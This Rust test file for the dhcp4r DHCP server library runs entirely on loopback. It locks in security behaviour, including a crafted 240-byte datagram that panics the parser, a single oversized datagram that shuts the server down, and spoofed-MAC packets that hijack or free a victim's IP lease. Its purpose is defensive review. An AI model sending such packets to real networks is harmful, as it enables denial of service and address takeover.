//! DHCP security: slowloris-style resilience + lease hijacking, part 5.
//!
//! Covers security-relevant behavior NOT locked by `test_security.rs`,
//! `test_security_extra.rs`, `test_security_edge.rs`, `test_security_wire.rs`,
//! `test_security_gates.rs`, or the RFC suites:
//!
//! - A. Slowloris analogues for a datagram server: dribbled 1-byte sends hold
//!   no server state (each `recv_from` is independent — there is nothing to
//!   keep half-open); short/partial-cookie datagrams are rejected without
//!   panic at exact size boundaries; a burst of legitimate clients is all
//!   answered with per-transaction xids; one datagram over the 1500-byte
//!   recv buffer kills the server thread (recv error returns from `serve`).
//! - B. Lease hijacking end-to-end (live): identity is the raw 6-byte
//!   `chaddr` with no authentication, so spoofing the victim `chaddr` in
//!   Discover recons the victim IP, in Request takes it over, and in a
//!   ciaddr-only renew it Acks — while a stranger's NAK leaves the victim
//!   lease intact and a spoofed Release frees it for claiming.
//!
//! `*_quirk` tests lock currently-unsafe behavior for review, not approval.

use dhcp4r::options::*;
use dhcp4r::packet::*;
use dhcp4r::server;
use std::collections::{HashMap, HashSet};
use std::net::{Ipv4Addr, UdpSocket};
use std::ops::Add;
use std::time::{Duration, Instant};

// ---------------------------------------------------------------------------
// helpers (same patterns as test_security_wire.rs)
// ---------------------------------------------------------------------------

fn unwrap_packet(r: Result<Packet, CustomErr<&[u8]>>) -> Packet {
    match r {
        Ok(p) => p,
        Err(_) => panic!("expected Ok Packet"),
    }
}

#[allow(clippy::too_many_arguments)]
fn make_raw(
    op: u8,
    hlen: u8,
    hops: u8,
    xid: u32,
    secs: u16,
    flags: [u8; 2],
    ci: [u8; 4],
    yi: [u8; 4],
    si: [u8; 4],
    gi: [u8; 4],
    chaddr: [u8; 6],
    opts_after_cookie: Vec<u8>,
) -> Vec<u8> {
    let mut v = vec![0u8; 236];
    v[0] = op;
    v[1] = 1;
    v[2] = hlen;
    v[3] = hops;
    v[4..8].copy_from_slice(&xid.to_be_bytes());
    v[8..10].copy_from_slice(&secs.to_be_bytes());
    v[10] = flags[0];
    v[11] = flags[1];
    v[12..16].copy_from_slice(&ci);
    v[16..20].copy_from_slice(&yi);
    v[20..24].copy_from_slice(&si);
    v[24..28].copy_from_slice(&gi);
    v[28..34].copy_from_slice(&chaddr);
    v.extend_from_slice(&[99, 130, 83, 99]);
    v.extend_from_slice(&opts_after_cookie);
    v
}

// Example-like handler: Discover->Offer, Request->Ack, Release|Decline gated,
// everything else ignored. Mirrors examples/server.rs match arms.
const IP_START: [u8; 4] = [192, 168, 2, 2];
const IP_START_NUM: u32 = u32::from_be_bytes(IP_START);
const LEASE_NUM: u32 = 252;
const LEASE_DURATION_SECS: u32 = 86400;

struct ExampleLike {
    leases: HashMap<Ipv4Addr, ([u8; 6], Option<Instant>)>,
    last_lease: u32,
    lease_duration: Duration,
}

impl ExampleLike {
    fn new() -> Self {
        Self {
            leases: HashMap::new(),
            last_lease: 0,
            lease_duration: Duration::new(LEASE_DURATION_SECS as u64, 0),
        }
    }
    fn available(&self, chaddr: &[u8; 6], addr: &Ipv4Addr) -> bool {
        let pos: u32 = (*addr).into();
        pos >= IP_START_NUM
            && pos < IP_START_NUM + LEASE_NUM
            && match self.leases.get(addr) {
                Some((mac, expiry)) => {
                    *mac == *chaddr || expiry.map_or(true, |exp| Instant::now().gt(&exp))
                }
                None => true,
            }
    }
    fn current_lease(&self, chaddr: &[u8; 6]) -> Option<Ipv4Addr> {
        for (i, v) in &self.leases {
            if v.0 == *chaddr {
                return Some(*i);
            }
        }
        None
    }
}

impl server::Handler for ExampleLike {
    fn handle_request(&mut self, server: &server::Server, in_packet: Packet) {
        match in_packet.message_type() {
            Ok(MessageType::Discover) => {
                if let Some(ip) = self.current_lease(&in_packet.chaddr) {
                    let _ = server.reply(
                        MessageType::Offer,
                        vec![DhcpOption::IpAddressLeaseTime(LEASE_DURATION_SECS)],
                        ip,
                        in_packet,
                    );
                    return;
                }
                for _ in 0..LEASE_NUM {
                    self.last_lease = (self.last_lease + 1) % LEASE_NUM;
                    let cand: Ipv4Addr = (IP_START_NUM + self.last_lease).into();
                    if self.available(&in_packet.chaddr, &cand) {
                        let _ = server.reply(
                            MessageType::Offer,
                            vec![DhcpOption::IpAddressLeaseTime(LEASE_DURATION_SECS)],
                            cand,
                            in_packet,
                        );
                        break;
                    }
                }
            }
            Ok(MessageType::Request) => {
                // NOTE: mirrors the example — the for_this_server gate is
                // commented out upstream, so Requests are honored regardless.
                let req_ip = match in_packet.option(REQUESTED_IP_ADDRESS) {
                    Some(DhcpOption::RequestedIpAddress(x)) => *x,
                    _ => in_packet.ciaddr,
                };
                if let Some(ip) = self.current_lease(&in_packet.chaddr) {
                    let _ = server.reply(
                        MessageType::Ack,
                        vec![DhcpOption::IpAddressLeaseTime(LEASE_DURATION_SECS)],
                        ip,
                        in_packet,
                    );
                    return;
                }
                if !self.available(&in_packet.chaddr, &req_ip) {
                    let _ = server.reply(
                        MessageType::Nak,
                        vec![DhcpOption::Message("Requested IP not available".to_string())],
                        Ipv4Addr::UNSPECIFIED,
                        in_packet,
                    );
                    return;
                }
                self.leases.insert(
                    req_ip,
                    (
                        in_packet.chaddr,
                        Some(Instant::now().add(self.lease_duration)),
                    ),
                );
                let _ = server.reply(
                    MessageType::Ack,
                    vec![DhcpOption::IpAddressLeaseTime(LEASE_DURATION_SECS)],
                    req_ip,
                    in_packet,
                );
            }
            Ok(MessageType::Release) | Ok(MessageType::Decline) => {
                if !server.for_this_server(&in_packet) {
                    return;
                }
                if let Some(ip) = self.current_lease(&in_packet.chaddr) {
                    self.leases.remove(&ip);
                }
            }
            _ => {}
        }
    }
}

fn serve_example_like() -> (std::net::SocketAddr, Ipv4Addr) {
    let srv_sock = UdpSocket::bind("127.0.0.1:0").unwrap();
    let srv_addr = srv_sock.local_addr().unwrap();
    let server_ip = Ipv4Addr::new(192, 168, 2, 1);
    std::thread::spawn(move || {
        let _ = server::Server::serve(
            srv_sock,
            server_ip,
            Ipv4Addr::new(192, 168, 2, 255),
            ExampleLike::new(),
        );
    });
    std::thread::sleep(Duration::from_millis(100));
    (srv_addr, server_ip)
}

fn discover(xid: u32, chaddr: [u8; 6]) -> Packet {
    Packet {
        reply: false, hops: 0, xid, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr,
        options: vec![DhcpOption::DhcpMessageType(MessageType::Discover)],
    }
}

fn send_recv(
    client: &UdpSocket,
    srv_addr: &std::net::SocketAddr,
    p: &Packet,
    buf: &mut [u8; 1500],
    rbuf: &mut [u8; 1500],
) -> Packet {
    client.send_to(&p.encode(buf).to_vec(), srv_addr).unwrap();
    let (n, _) = client.recv_from(rbuf).expect("expected reply");
    unwrap_packet(Packet::from(&rbuf[..n]))
}

// ===========================================================================
// A. Slowloris analogues: dribbles, short datagrams, bursts, truncation
// ===========================================================================

/// Slowloris adaptation to UDP: 100 one-byte "trickled" datagrams hold no
/// server state (each `recv_from` is independent — there is nothing to keep
/// half-open), are all ignored, and the next valid Discover is answered.
/// Locked: dribble is pure noise, not resource retention.
#[test]
fn sec5_dribbled_single_bytes_hold_no_state() {
    let (srv_addr, _) = serve_example_like();
    let client = UdpSocket::bind("127.0.0.1:0").unwrap();
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    for _ in 0..100 {
        client.send_to(&[0x99], srv_addr).unwrap();
    }
    let mut buf = [0u8; 1500];
    let mut rbuf = [0u8; 1500];
    let rep = send_recv(&client, &srv_addr, &discover(0xD101, [0x11; 6]), &mut buf, &mut rbuf);
    assert_eq!(rep.message_type(), Ok(MessageType::Offer));
    assert_eq!(rep.yiaddr, Ipv4Addr::new(192, 168, 2, 3));
}

/// Size boundaries around the 236-byte header + 4-byte cookie: header-only
/// (236) and partial-cookie (237–239) datagrams are rejected with errors and
/// never panic; only the cookie-complete-but-optionless 240-byte form panics
/// (covered by the next test). Locks exactly where Err ends and panic begins.
#[test]
fn sec5_short_and_partial_cookie_rejected_without_panic() {
    let mut header_only = vec![0u8; 236];
    header_only[0] = 1;
    header_only[1] = 1;
    header_only[2] = 6;
    assert!(matches!(Packet::from(&header_only), Err(CustomErr::NomError(_))));
    for len in [237usize, 238, 239] {
        let mut v = header_only.clone();
        v.extend_from_slice(&[99, 130, 83, 99][..len - 236]);
        assert!(
            matches!(Packet::from(&v), Err(CustomErr::NomError(_))),
            "len {} must be NomError, not panic",
            len
        );
    }
    assert!(matches!(Packet::from(&[0u8; 10]), Err(CustomErr::InvalidHlen)));
    assert!(matches!(Packet::from(&[] as &[u8]), Err(CustomErr::InvalidHlen)));
}

/// The 240-byte cookie-complete, optionless datagram panics on
/// `rest.split_at(1)` — the smallest single-packet server-thread killer.
/// Locked with `should_panic` (live kill covered by the serve-panic tests).
#[test]
#[should_panic]
fn sec5_cookie_only_no_options_panics_quirk() {
    let mut raw = vec![0u8; 236];
    raw[0] = 1;
    raw[1] = 1;
    raw[2] = 6;
    raw.extend_from_slice(&[99, 130, 83, 99]);
    assert_eq!(raw.len(), 240);
    let _ = Packet::from(&raw);
}

/// Overwhelm resilience: 30 back-to-back Discovers from distinct clients are
/// all answered with per-transaction xids and distinct pool IPs, and a
/// follow-up still works — the single-threaded loop keeps up, no drops or
/// cross-talk on loopback. Locked.
#[test]
fn sec5_burst_30_discovers_all_answered() {
    let (srv_addr, _) = serve_example_like();
    let client = UdpSocket::bind("127.0.0.1:0").unwrap();
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let mut buf = [0u8; 1500];
    let mut rbuf = [0u8; 1500];
    let mut seen_xids = HashSet::new();
    let mut seen_ips = HashSet::new();
    for i in 0..30u32 {
        let ch = [i as u8, 0xAA, 0xBB, 0xCC, 0xDD, (i >> 8) as u8];
        let xid = 0xE000 + i;
        client
            .send_to(&discover(xid, ch).encode(&mut buf).to_vec(), srv_addr)
            .unwrap();
        let (n, _) = client.recv_from(&mut rbuf).expect("burst reply");
        let rep = unwrap_packet(Packet::from(&rbuf[..n]));
        assert_eq!(rep.message_type(), Ok(MessageType::Offer));
        assert_eq!(rep.xid, xid, "per-transaction xid echo");
        seen_xids.insert(rep.xid);
        assert!(seen_ips.insert(rep.yiaddr), "distinct offers");
    }
    assert_eq!(seen_xids.len(), 30);
    assert_eq!(seen_ips.len(), 30);
    // still responsive afterwards
    let rep = send_recv(&client, &srv_addr, &discover(0xE099, [0x99; 6]), &mut buf, &mut rbuf);
    assert_eq!(rep.message_type(), Ok(MessageType::Offer));
}

/// QUIRK (single-packet kill): a datagram larger than the 1500-byte recv
/// buffer makes `recv_from` fail on Windows, and `serve` returns on ANY recv
/// error — so one 1844-byte datagram shuts the whole server down (the thread
/// exits; follow-up clients get connection-reset, not replies). A 1498-byte
/// datagram works fine, pinning the boundary at the buffer size. The decoder
/// itself would have handled the truncated bytes (see the local assert), so
/// the kill happens at the socket layer, not in parsing. Locked.
#[test]
fn sec5_oversized_datagram_kills_server_thread_quirk() {
    let mut opts = vec![53, 1, 1];
    for _ in 0..400 {
        opts.extend_from_slice(&[200, 2, 7, 8]);
    }
    opts.push(255);
    let raw = make_raw(
        1, 6, 0, 0xC101, 0, [0, 0],
        [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0],
        [0x77; 6], opts,
    );
    assert_eq!(raw.len(), 1844);
    // the decoder itself is fine with the truncated prefix (cut lands
    // mid-TLV, the swallow skips one byte) — proving the kill is at recv:
    let cut = unwrap_packet(Packet::from(&raw[..1500]));
    assert_eq!(cut.message_type(), Ok(MessageType::Discover));
    let srv_sock = UdpSocket::bind("127.0.0.1:0").unwrap();
    let srv_addr = srv_sock.local_addr().unwrap();
    struct H;
    impl server::Handler for H {
        fn handle_request(&mut self, s: &server::Server, p: Packet) {
            let _ = s.reply(
                MessageType::Offer,
                vec![],
                Ipv4Addr::new(192, 168, 9, 10),
                p,
            );
        }
    }
    let handle = std::thread::spawn(move || {
        server::Server::serve(
            srv_sock,
            Ipv4Addr::new(192, 168, 9, 1),
            Ipv4Addr::new(192, 168, 9, 255),
            H,
        )
    });
    std::thread::sleep(Duration::from_millis(100));
    let client = UdpSocket::bind("127.0.0.1:0").unwrap();
    client
        .set_read_timeout(Some(Duration::from_millis(500)))
        .unwrap();
    let mut buf = [0u8; 1500];
    let mut rbuf = [0u8; 1500];
    // baseline: a near-buffer-size (1498 B) datagram is answered normally
    let mut big_opts = vec![53, 1, 1];
    for _ in 0..418 {
        big_opts.extend_from_slice(&[200, 1, 7]);
    }
    big_opts.push(255);
    let big = make_raw(
        1, 6, 0, 0xC102, 0, [0, 0],
        [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0],
        [0x78; 6], big_opts,
    );
    assert_eq!(big.len(), 1498);
    client.send_to(&big, srv_addr).unwrap();
    let (n, _) = client.recv_from(&mut rbuf).expect("baseline reply");
    assert_eq!(unwrap_packet(Packet::from(&rbuf[..n])).xid, 0xC102);
    // one oversized datagram: no reply, server thread exits
    client.send_to(&raw, srv_addr).unwrap();
    assert!(
        client.recv_from(&mut rbuf).is_err(),
        "oversized datagram gets no reply"
    );
    std::thread::sleep(Duration::from_millis(200));
    assert!(handle.is_finished(), "serve loop must have exited");
    // server stays dead: follow-up valid Discover gets no Offer
    let p = Packet {
        reply: false, hops: 0, xid: 0xC103, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: [0x79; 6],
        options: vec![DhcpOption::DhcpMessageType(MessageType::Discover)],
    };
    client.send_to(&p.encode(&mut buf).to_vec(), srv_addr).unwrap();
    assert!(
        client.recv_from(&mut rbuf).is_err(),
        "dead server answers nothing"
    );
}

// ===========================================================================
// B. Lease hijacking end-to-end (live): chaddr-only identity, no auth
// ===========================================================================

/// Full hijack chain, step 1 (recon): attacker sends Discover spoofing the
/// victim `chaddr` and is offered the victim's *current* IP — identity is
/// chaddr bytes only, so the offer itself leaks the victim's address.
#[test]
fn sec5_hijack_discover_as_victim_offered_victim_ip_live() {
    let (srv_addr, server_ip) = serve_example_like();
    let client = UdpSocket::bind("127.0.0.1:0").unwrap();
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let mut buf = [0u8; 1500];
    let mut rbuf = [0u8; 1500];
    let victim = [0x51; 6];
    // victim legitimately takes .60
    let req = Packet {
        reply: false, hops: 0, xid: 0xF001, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: victim,
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Request),
            DhcpOption::ServerIdentifier(server_ip),
            DhcpOption::RequestedIpAddress(Ipv4Addr::new(192, 168, 2, 60)),
        ],
    };
    assert_eq!(
        send_recv(&client, &srv_addr, &req, &mut buf, &mut rbuf).yiaddr,
        Ipv4Addr::new(192, 168, 2, 60)
    );
    // attacker replays victim chaddr in Discover -> offered victim's .60
    let rep = send_recv(&client, &srv_addr, &discover(0xF002, victim), &mut buf, &mut rbuf);
    assert_eq!(rep.message_type(), Ok(MessageType::Offer));
    assert_eq!(
        rep.yiaddr,
        Ipv4Addr::new(192, 168, 2, 60),
        "spoofed Discover recons victim IP"
    );
}

/// Full hijack chain, step 2 (takeover): attacker sends Request spoofing the
/// victim `chaddr` and is Acked for the victim's IP with zero credentials —
/// same bytes any observer saw on the wire. Locked live.
#[test]
fn sec5_hijack_request_as_victim_acked_live() {
    let (srv_addr, server_ip) = serve_example_like();
    let client = UdpSocket::bind("127.0.0.1:0").unwrap();
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let mut buf = [0u8; 1500];
    let mut rbuf = [0u8; 1500];
    let victim = [0x52; 6];
    let req = Packet {
        reply: false, hops: 0, xid: 0xF010, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: victim,
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Request),
            DhcpOption::ServerIdentifier(server_ip),
            DhcpOption::RequestedIpAddress(Ipv4Addr::new(192, 168, 2, 61)),
        ],
    };
    assert_eq!(
        send_recv(&client, &srv_addr, &req, &mut buf, &mut rbuf).yiaddr,
        Ipv4Addr::new(192, 168, 2, 61)
    );
    // "attacker" knows only public bytes: victim chaddr + IP from recon
    let hijack = Packet {
        reply: false, hops: 0, xid: 0xF011, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: victim, // spoofed
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Request),
            DhcpOption::ServerIdentifier(server_ip),
            DhcpOption::RequestedIpAddress(Ipv4Addr::new(192, 168, 2, 61)),
        ],
    };
    let rep = send_recv(&client, &srv_addr, &hijack, &mut buf, &mut rbuf);
    assert_eq!(rep.message_type(), Ok(MessageType::Ack));
    assert_eq!(rep.yiaddr, Ipv4Addr::new(192, 168, 2, 61), "takeover Acked");
}

/// Renew-path hijack: attacker sends ciaddr-only Request (no Requested IP,
/// no Server ID) spoofing victim `chaddr` and is Acked — the RENEWING
/// fallback needs no options at all. Locked live.
#[test]
fn sec5_hijack_renew_via_ciaddr_spoof_live() {
    let (srv_addr, server_ip) = serve_example_like();
    let client = UdpSocket::bind("127.0.0.1:0").unwrap();
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let mut buf = [0u8; 1500];
    let mut rbuf = [0u8; 1500];
    let victim = [0x53; 6];
    let req = Packet {
        reply: false, hops: 0, xid: 0xF020, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: victim,
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Request),
            DhcpOption::ServerIdentifier(server_ip),
            DhcpOption::RequestedIpAddress(Ipv4Addr::new(192, 168, 2, 62)),
        ],
    };
    assert_eq!(
        send_recv(&client, &srv_addr, &req, &mut buf, &mut rbuf).yiaddr,
        Ipv4Addr::new(192, 168, 2, 62)
    );
    // renew-shaped hijack: only ciaddr + spoofed chaddr
    let renew = Packet {
        reply: false, hops: 0, xid: 0xF021, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::new(192, 168, 2, 62), yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: victim, // spoofed
        options: vec![DhcpOption::DhcpMessageType(MessageType::Request)],
    };
    let rep = send_recv(&client, &srv_addr, &renew, &mut buf, &mut rbuf);
    assert_eq!(rep.message_type(), Ok(MessageType::Ack));
    assert_eq!(rep.yiaddr, Ipv4Addr::new(192, 168, 2, 62), "renew hijack Acked");
}

/// Failed hijack attempt changes nothing: a stranger's Request for the taken
/// `.63` gets NAK, and the victim's lease is intact (still offered `.63`).
/// Locks NAK-without-side-effects live.
#[test]
fn sec5_hijack_nak_leaves_victim_lease_intact_live() {
    let (srv_addr, server_ip) = serve_example_like();
    let client = UdpSocket::bind("127.0.0.1:0").unwrap();
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let mut buf = [0u8; 1500];
    let mut rbuf = [0u8; 1500];
    let victim = [0x54; 6];
    let stranger = [0x55; 6];
    let req = Packet {
        reply: false, hops: 0, xid: 0xF030, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: victim,
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Request),
            DhcpOption::ServerIdentifier(server_ip),
            DhcpOption::RequestedIpAddress(Ipv4Addr::new(192, 168, 2, 63)),
        ],
    };
    assert_eq!(
        send_recv(&client, &srv_addr, &req, &mut buf, &mut rbuf).yiaddr,
        Ipv4Addr::new(192, 168, 2, 63)
    );
    // stranger grabs at .63 -> NAK
    let grab = Packet {
        reply: false, hops: 0, xid: 0xF031, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: stranger,
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Request),
            DhcpOption::ServerIdentifier(server_ip),
            DhcpOption::RequestedIpAddress(Ipv4Addr::new(192, 168, 2, 63)),
        ],
    };
    assert_eq!(
        send_recv(&client, &srv_addr, &grab, &mut buf, &mut rbuf).message_type(),
        Ok(MessageType::Nak)
    );
    // victim still holds .63
    let rep = send_recv(&client, &srv_addr, &discover(0xF032, victim), &mut buf, &mut rbuf);
    assert_eq!(rep.yiaddr, Ipv4Addr::new(192, 168, 2, 63), "victim intact after NAK");
}

/// Release-hijack end state: spoofed Release frees `.64`, and a stranger
/// immediately claims it — full free-then-takeover chain over the wire.
#[test]
fn sec5_hijack_release_spoof_frees_then_attacker_claims_live() {
    let (srv_addr, server_ip) = serve_example_like();
    let client = UdpSocket::bind("127.0.0.1:0").unwrap();
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let mut buf = [0u8; 1500];
    let mut rbuf = [0u8; 1500];
    let victim = [0x56; 6];
    let attacker = [0x57; 6];
    let req = Packet {
        reply: false, hops: 0, xid: 0xF040, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: victim,
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Request),
            DhcpOption::ServerIdentifier(server_ip),
            DhcpOption::RequestedIpAddress(Ipv4Addr::new(192, 168, 2, 64)),
        ],
    };
    assert_eq!(
        send_recv(&client, &srv_addr, &req, &mut buf, &mut rbuf).yiaddr,
        Ipv4Addr::new(192, 168, 2, 64)
    );
    // spoofed Release (victim chaddr, correct server ID): no reply, freed
    let rel = Packet {
        reply: false, hops: 0, xid: 0xF041, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: victim, // spoofed
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Release),
            DhcpOption::ServerIdentifier(server_ip),
        ],
    };
    client.send_to(&rel.encode(&mut buf).to_vec(), srv_addr).unwrap();
    // attacker (own chaddr) claims the freed .64
    let claim = Packet {
        reply: false, hops: 0, xid: 0xF042, secs: 0, broadcast: false,
        ciaddr: Ipv4Addr::UNSPECIFIED, yiaddr: Ipv4Addr::UNSPECIFIED,
        siaddr: Ipv4Addr::UNSPECIFIED, giaddr: Ipv4Addr::UNSPECIFIED,
        chaddr: attacker,
        options: vec![
            DhcpOption::DhcpMessageType(MessageType::Request),
            DhcpOption::ServerIdentifier(server_ip),
            DhcpOption::RequestedIpAddress(Ipv4Addr::new(192, 168, 2, 64)),
        ],
    };
    let rep = send_recv(&client, &srv_addr, &claim, &mut buf, &mut rbuf);
    assert_eq!(rep.message_type(), Ok(MessageType::Ack));
    assert_eq!(rep.yiaddr, Ipv4Addr::new(192, 168, 2, 64), "freed IP claimed");
}
